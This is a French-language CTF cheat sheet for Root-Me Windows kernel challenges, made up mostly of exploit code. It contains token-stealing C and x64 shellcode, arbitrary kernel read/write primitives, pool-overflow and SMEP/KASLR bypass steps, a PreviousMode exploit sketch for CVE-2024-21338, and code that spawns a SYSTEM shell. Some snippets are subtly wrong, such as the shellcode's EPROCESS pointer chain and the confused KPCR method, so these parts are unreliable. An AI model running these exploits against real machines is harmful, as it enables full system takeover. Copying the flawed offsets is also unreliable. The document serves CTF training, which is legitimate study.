# CTF App-System — Windows Kernel x64

## Vue d'ensemble des challenges WinKern Root-Me

Les challenges Windows Kernel Root-Me fournissent généralement :
- Un driver kernel vulnérable (`.sys`)
- Un programme de test ou interface IOCTL
- Accès à une VM Windows via RDP ou fichier challenge à analyser

**Objectif** : escalade de privilèges → SYSTEM → lire le flag.

## Structures Windows Kernel essentielles

### _EPROCESS (Process Control Block)

```c
// Offsets clés (Windows 10 1909, varient selon version)
_EPROCESS:
  +0x000 Pcb              : _KPROCESS
  +0x2e0 UniqueProcessId  : HANDLE    // PID du process
  +0x2e8 ActiveProcessLinks: LIST_ENTRY // Liste doublement chaînée de tous les process
  +0x358 Token            : _EX_FAST_REF // Token de sécurité du process
  // Token encodé : valeur & ~0xF = adresse réelle
```

```python
# Offsets courants à vérifier selon la version Windows
# Windows 10 1809 : ActiveProcessLinks=+0x2f0, Token=+0x360
# Windows 10 1909 : ActiveProcessLinks=+0x2e8, Token=+0x358
# Windows 10 21H1 : ActiveProcessLinks=+0x448, Token=+0x4b8
# Windows 11     : ActiveProcessLinks=+0x448, Token=+0x4b8

# Vérifier avec WinDbg :
# dt nt!_EPROCESS
# dt nt!_EPROCESS @$proc
```

## Token Stealing — Technique principale

```c
// Exploit en C pour token stealing (intégré dans l'exploit userland)
#include <windows.h>
#include <stdio.h>

// Cette fonction est exécutée en kernel context (via shellcode ou ROP)
void __fastcall steal_token() {
    ULONG_PTR eprocess_offset_pid    = 0x2e0;  // UniqueProcessId
    ULONG_PTR eprocess_offset_list   = 0x2e8;  // ActiveProcessLinks
    ULONG_PTR eprocess_offset_token  = 0x358;  // Token

    // 1. Obtenir le KPROCESS courant via nt!PsGetCurrentProcess (ou GS segment)
    // En shellcode kernel : __readgsqword(0x188) → KTHREAD → Process
    
    // 2. Parcourir la liste des process pour trouver SYSTEM (PID=4)
    ULONG_PTR current = (ULONG_PTR)PsGetCurrentProcess();
    ULONG_PTR system_proc = current;
    
    do {
        ULONG_PTR pid = *(ULONG_PTR*)(system_proc + eprocess_offset_pid);
        if (pid == 4) break;  // SYSTEM process
        ULONG_PTR flink = *(ULONG_PTR*)(system_proc + eprocess_offset_list);
        system_proc = flink - eprocess_offset_list;
    } while (system_proc != current);
    
    // 3. Copier le token SYSTEM vers le process courant
    ULONG_PTR system_token = *(ULONG_PTR*)(system_proc + eprocess_offset_token);
    *(ULONG_PTR*)(current + eprocess_offset_token) = system_token;
}
```

### Shellcode token stealing (x64)

```python
# Shellcode assembleur pour token stealing en kernel x64
from pwn import *

# Windows 10 1909 offsets
EPROCESS_PID_OFFSET   = 0x2e0
EPROCESS_LIST_OFFSET  = 0x2e8
EPROCESS_TOKEN_OFFSET = 0x358

shellcode = asm(f'''
    ; Sauvegarder les registres
    push rax
    push rbx
    push rcx
    push rdx
    
    ; Obtenir _EPROCESS courant via KTHREAD (GS:[0x188])
    mov rax, qword ptr gs:[0x188]    ; CurrentThread
    mov rax, qword ptr [rax + 0x70]  ; Process (_KPROCESS)
    mov rax, qword ptr [rax + 0x220] ; _EPROCESS (si KPROCESS en premier)
    ; Note: peut varier, parfois directement gs:[0x188]+offset
    
    ; Sauvegarder l'_EPROCESS courant
    mov rdx, rax
    
    ; Parcourir ActiveProcessLinks pour trouver SYSTEM (PID=4)
loop_start:
    mov rax, [rax + {EPROCESS_LIST_OFFSET}]  ; flink
    sub rax, {EPROCESS_LIST_OFFSET}           ; retour au début de EPROCESS
    cmp qword ptr [rax + {EPROCESS_PID_OFFSET}], 4  ; PID == SYSTEM ?
    jne loop_start
    
    ; Copier token SYSTEM vers process courant
    mov rbx, [rax + {EPROCESS_TOKEN_OFFSET}] ; Token du SYSTEM
    mov [rdx + {EPROCESS_TOKEN_OFFSET}], rbx  ; Overwrite notre token
    
    ; Restaurer registres
    pop rdx
    pop rcx
    pop rbx
    pop rax
    ret
''', arch='amd64', os='windows')
```

## Interface IOCTL (DeviceIoControl)

```c
// Pattern typique d'un challenge kernel Windows
// Le driver expose un device \\\\.\\VulnDriver
// Interaction via DeviceIoControl

#include <windows.h>

int main() {
    // Ouvrir le device
    HANDLE hDevice = CreateFileA(
        "\\\\.\\VulnDriver",      // Nom du device
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Impossible d'ouvrir le device: %d\n", GetLastError());
        return 1;
    }
    
    // Envoyer une requête IOCTL
    DWORD bytesReturned;
    char inputBuffer[1024] = {0};
    char outputBuffer[1024] = {0};
    
    // IOCTL_CODE varie selon le challenge
    DeviceIoControl(hDevice, IOCTL_CODE, 
                    inputBuffer, sizeof(inputBuffer),
                    outputBuffer, sizeof(outputBuffer),
                    &bytesReturned, NULL);
    
    CloseHandle(hDevice);
}
```

## Pool Overflow Exploitation

```c
// Non-Paged Pool overflow → corrompre un objet adjacent
// Technique : spray + overflow + use after free ou vtable corruption

// 1. Spray avec des objets connus (même taille que la cible)
for (int i = 0; i < 1000; i++) {
    // Créer des Named Pipes ou Events pour occuper le pool
    HANDLE hPipe = CreateNamedPipeA(...);  // kmalloc-style allocation
}

// 2. Créer l'objet vulnérable
HANDLE hVuln = CreateFile("\\\\.\\VulnDev", ...);

// 3. Overflow → corrompre l'objet adjacent
DeviceIoControl(hVuln, IOCTL_OVERFLOW, 
                overflow_data, sizeof(overflow_data), ...);

// 4. Trigger la corruption (appeler la méthode corrompue)
// Ex: écriture dans le pipe va appeler vtable corrompue
WriteFile(hCorruptedPipe, data, sizeof(data), &bytes, NULL);
```

## SMEP Bypass pour Windows Kernel

```c
// SMEP (Supervisor Mode Execution Prevention) : 
// Le kernel ne peut pas exécuter du code en espace user

// Méthode 1 : ROP kernel uniquement (pas de shellcode userland)
// Toute l'exploitation reste dans le kernel via gadgets ROP

// Méthode 2 : Modifier CR4 (si possible)
// CR4.SMEP = bit 20 → mettre à 0 pour désactiver SMEP
// Gadget : mov cr4, rax avec rax = cr4_val & ~(1<<20)

// Méthode 3 : Utiliser des pages kernel exécutables
// Trouver une région kernel RWX (rare sur Windows moderne)

// Méthode 4 : Retour vers un gadget kernel qui appelle code userland
// Via pointeur de stack kernel qui pointe vers userland

// Gadgets classiques pour token stealing sans SMEP bypass :
// On fait tout en kernel, pas besoin de code userland
```

## Kernel Information Leak (KASLR bypass)

```c
// KASLR = Kernel Address Space Layout Randomization
// Nécessite de leaker le kernel base pour calculer les adresses

// Méthode 1 : NtQuerySystemInformation (non-admin requis)
SYSTEM_MODULE_INFORMATION smi;
NtQuerySystemInformation(SystemModuleInformation, &smi, sizeof(smi), &size);
// smi.Modules[0].ImageBase = adresse de ntoskrnl.exe

// Méthode 2 : EnumDeviceDrivers (accès bas-niveau)
LPVOID drivers[1024];
DWORD cbNeeded;
EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
// drivers[0] = base de ntoskrnl

// Méthode 3 : NtQueryIntervalProfile
// Permet de leaker une adresse kernel via timing sur certains systèmes

// Méthode 4 : Exploit arbitrary read pour lire le PEB/TEB kernel
// Via la vulnérabilité elle-même (IOCTL de lecture arbitraire)
```

## Arbitrary Read/Write Primitives

```c
// Pattern AAR (Arbitrary Address Read)
// IOCTL qui lit à une adresse fournie par l'utilisateur

ULONG64 kernel_read64(HANDLE hDevice, ULONG64 addr) {
    struct { ULONG64 addr; ULONG64 value; } req = {addr, 0};
    DeviceIoControl(hDevice, IOCTL_READ, &req, sizeof(req), 
                    &req, sizeof(req), &bytes, NULL);
    return req.value;
}

// Pattern AAW (Arbitrary Address Write)
void kernel_write64(HANDLE hDevice, ULONG64 addr, ULONG64 value) {
    struct { ULONG64 addr; ULONG64 value; } req = {addr, value};
    DeviceIoControl(hDevice, IOCTL_WRITE, &req, sizeof(req), 
                    NULL, 0, &bytes, NULL);
}

// Avec AAR/AAW : token stealing sans shellcode
ULONG64 system_eproc = find_eprocess_by_pid(hDevice, 4);
ULONG64 current_eproc = find_eprocess_by_pid(hDevice, GetCurrentProcessId());
ULONG64 system_token = kernel_read64(hDevice, system_eproc + TOKEN_OFFSET) & ~0xF;
kernel_write64(hDevice, current_eproc + TOKEN_OFFSET, system_token);
```

## Après élévation de privilèges : spawner SYSTEM shell

```c
// Une fois que notre token = SYSTEM token
void spawn_system_shell() {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    // Lancer cmd.exe avec les nouveaux privilèges SYSTEM
    CreateProcessA(
        "C:\\Windows\\System32\\cmd.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE,
        NULL, NULL, &si, &pi
    );
    
    printf("[+] Shell lancé avec PID %d\n", pi.dwProcessId);
    WaitForSingleObject(pi.hProcess, INFINITE);
}
```

## Workflow Root-Me WinKern

```
1. Analyser le driver (.sys) avec IDA Pro ou Ghidra
   - Identifier les IOCTL handlers (DriverEntry → DispatchDeviceControl)
   - Chercher les vulnérabilités : buffer overflow, integer overflow, UAF

2. Identifier l'IOCTL code vulnérable
   - Calculer : IOCTL = CTL_CODE(DeviceType, Function, Method, Access)
   - Ou extraire via IDA du switch/case dans le handler

3. Reproduire la vulnérabilité localement
   - VM Windows avec WinDbg attaché (double VM ou kernel debugging)
   - Activer page heap : gflags /i target.exe +hpa

4. Développer l'exploit
   - Identifier offsets EPROCESS selon la version Windows fournie
   - Écrire le shellcode ou ROP chain

5. Transférer et tester
   - Sur Root-Me : souvent VM accessible via RDP ou exploit à soumettre
```

## WinDbg commandes utiles

```
// Kernel debugging
dt nt!_EPROCESS            // Structure EPROCESS
dt nt!_EPROCESS @$proc     // EPROCESS du process courant
!process 0 0               // Lister tous les process
!process 0 0 cmd.exe       // Process spécifique

// Offsets dynamiques
?? #FIELD_OFFSET(nt!_EPROCESS, Token)
?? #FIELD_OFFSET(nt!_EPROCESS, ActiveProcessLinks)

// Chercher SYSTEM process
.foreach (proc {!process 0 0 System}) { dt nt!_EPROCESS proc Token }

// Breakpoint sur IOCTL handler
bp \VulnDriver!DispatchDeviceControl
bp \VulnDriver!DeviceIoControl

// Examiner la pile
k                  // Call stack
kn                 // Call stack avec numéros
r                  // Registres
dq rsp L10         // Dump 10 qwords depuis RSP
```

## PreviousMode Write — Technique moderne (CVE-2024-21338)

**Source :** [github.com/hakaioffsec/CVE-2024-21338](https://github.com/hakaioffsec/CVE-2024-21338)  
**Concept :** Modifier `KTHREAD->PreviousMode` de `UserMode (1)` → `KernelMode (0)`.  
**Effet :** Toutes les vérifications `ProbeForRead`/`ProbeForWrite` sont bypassées → AAW parfait via `NtWriteVirtualMemory`.

```c
// KTHREAD offset (Windows 10 20H2 / Windows 11)
// +0x232 PreviousMode : UChar
// PsGetCurrentThread() ou GS:[0x188] → KTHREAD courant

// Étape 1 : Trouver l'adresse du PreviousMode dans le kernel
// Via NtQuerySystemInformation(SystemThreadInformation) + ETHREAD + KTHREAD
ULONG64 kthread_addr = get_kthread_addr();
ULONG64 previousmode_addr = kthread_addr + 0x232;

// Étape 2 : Écrire 0 à PreviousMode (via la vulnérabilité du driver)
// Exemple : driver avec write arbitraire via IOCTL
DeviceIoControl(hDevice, IOCTL_WRITE_BYTE,
                &previousmode_addr, sizeof(ULONG64),
                NULL, 0, &bytes, NULL);

// Étape 3 : Maintenant NtWriteVirtualMemory écrit dans le kernel !
ULONG64 system_token = get_system_token();
ULONG64 our_token_addr = get_current_process_token_addr();

NtWriteVirtualMemory(GetCurrentProcess(),
                     (PVOID)our_token_addr,
                     &system_token,
                     sizeof(ULONG64),
                     NULL);

// Étape 4 : Restaurer PreviousMode (pour stabilité)
UCHAR user_mode = 1;
NtWriteVirtualMemory(GetCurrentProcess(),
                     (PVOID)previousmode_addr,
                     &user_mode, 1, NULL);

// Étape 5 : Spawn SYSTEM shell
system("cmd.exe");
```

### Trouver KTHREAD address depuis userland (méthodes)

```c
// Méthode A : NtQuerySystemInformation + ETHREAD walking
SYSTEM_THREAD_INFORMATION sti;
NtQuerySystemInformation(SystemProcessInformation, buf, size, &ret);
// Trouver le thread courant via GetCurrentThreadId()
// ETHREAD = pointeur dans la liste + offset kernel
// KTHREAD = début de ETHREAD

// Méthode B : NtCurrentTeb()->Tib.Self via KPCR
// GS segment en kernel = KPCR → KPCR.Prcb.CurrentThread = KTHREAD
// Accessible indirectement via certaines fonctions NT non-documentées

// Méthode C : CreateToolhelp32Snapshot pour lister threads puis 
// cross-référencer avec NtQuerySystemInformation(SystemHandleInformation)
// pour obtenir l'adresse kernel de l'ETHREAD

// Méthode pratique CTF : si le driver a un read arbitraire (AAR)
// Lire GS:[0x188] → KTHREAD addr
ULONG64 kthread = kernel_read64(hDevice, gs_base + 0x188);
```

## Handle Table Exploitation

```c
// Handle Table : structure kernel qui mappe les handles aux objets
// Chaque process a une _HANDLE_TABLE dans l'_EPROCESS
// Corrompre la handle table → pointer un handle vers un objet arbitraire

// Offset dans _EPROCESS
// +0x418 ObjectTable : _HANDLE_TABLE*

// _HANDLE_TABLE_ENTRY (4 bytes en mode compact)
// GrantedAccess | ObjectHeader (encodé)

// Technique : via pool overflow corrompre ObjectHeader d'un file handle
// → accès à un fichier kernel protégé

// Alternative : corrompre le handle vers notre propre token
// → donner des privilèges supplémentaires
```

## Windows 11 Mitigations à connaître

```
VBS (Virtualization-Based Security) :
  → Hypervisor protège les pages de code kernel
  → Les ROP chains kernel doivent être dans des zones non-protégées
  
HVCI (Hypervisor-Protected Code Integrity) :
  → Empêche l'exécution de code non signé en kernel
  → Shellcode kernel traditionnel ne fonctionne plus
  → ROP uniquement (gadgets dans code signé)

CFG (Control Flow Guard) :
  → Vérifie les appels indirects en userland
  → En kernel : CET (Control-flow Enforcement Technology) sur Intel 11+
  
Protected Process Light (PPL) :
  → Certains process (LSASS, antivirus) ne peuvent pas être accédés
  → Requiert certificat Authenticode avec EKU spéciale

Shadow Stack (Intel CET) :
  → Stack supplémentaire en lecture seule pour les adresses de retour
  → Présent sur Windows 11 avec CPU compatible
  → Rend les attaques ROP classiques beaucoup plus difficiles
```

## Analyse d'un driver vulnérable (IDA/Ghidra workflow)

```bash
# 1. Trouver le DriverEntry et la dispatch routine
# IDA : Ctrl+G → DriverEntry
# Chercher : DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = handler

# 2. Analyser le IOCTL handler (DispatchDeviceControl)
# Pattern classique :
# IoGetCurrentIrpStackLocation(Irp)
# Parameters.DeviceIoControl.IoControlCode → switch/case
# Parameters.DeviceIoControl.InputBufferLength → taille input
# InputBuffer = Irp->AssociatedIrp.SystemBuffer (METHOD_BUFFERED)

# 3. Chercher les vulnérabilités classiques
# - memcpy sans vérification de taille → overflow
# - Accès à des pointeurs user fournis sans ProbeForRead → arbitrary read
# - Use-after-free dans les IRP handlers
# - Integer overflow dans les calculs de taille

# 4. Extraire les IOCTL codes
# Python script pour IDA :
# import idaapi, idc
# for ref in CodeRefsTo(handler_ea, True):
#     print(hex(idc.get_wide_dword(ref - 4)))  # Valeur du IOCTL avant le jump
```

## CTL_CODE pour identifier les IOCTLs

```c
// Macro Windows pour calculer les IOCTL codes
#define CTL_CODE(DeviceType, Function, Method, Access) ( \
    ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))

// Méthodes de transfert
#define METHOD_BUFFERED   0
#define METHOD_IN_DIRECT  1
#define METHOD_OUT_DIRECT 2
#define METHOD_NEITHER    3

// Accès
#define FILE_ANY_ACCESS     0
#define FILE_READ_ACCESS    1
#define FILE_WRITE_ACCESS   2

// Exemple : IOCTL code = 0x222003
// → DeviceType=0x22, Function=0x800, Method=3 (NEITHER), Access=0
// CTL_CODE(0x22, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS) = 0x222003
```
